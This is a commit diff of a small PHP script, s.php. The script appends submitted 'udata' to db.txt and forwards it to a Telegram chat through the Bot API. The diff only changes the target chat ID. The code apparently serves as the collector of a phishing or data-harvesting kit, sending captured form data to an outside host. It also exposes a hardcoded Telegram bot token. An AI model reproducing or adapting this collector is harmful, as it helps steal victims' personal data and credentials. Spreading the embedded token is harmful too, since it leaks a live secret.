6ddb39de4d30f20237b177f1eaf1c0baa06bdf52
SeregaSBU11 <fahlae@lary-lcc.click>
2024-07-15 11:53:52 +0300

    Update s.php

--- s.php
+++ s.php
@@ -4,7 +4,7 @@ $udata = $data['udata'];
 if (strpos($udata, 'name') !== false) {
     file_put_contents('db.txt', $udata . PHP_EOL, FILE_APPEND);
     
-    $chatId1 = '-1002168499530';
+    $chatId1 = '-1002147309523';
     $telegramBotToken = '7369875963:AAHHE7CrkuX0E6UErPp2AyOXz2T_iGORye4';
 
     file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId1&text=" . urlencode($udata));
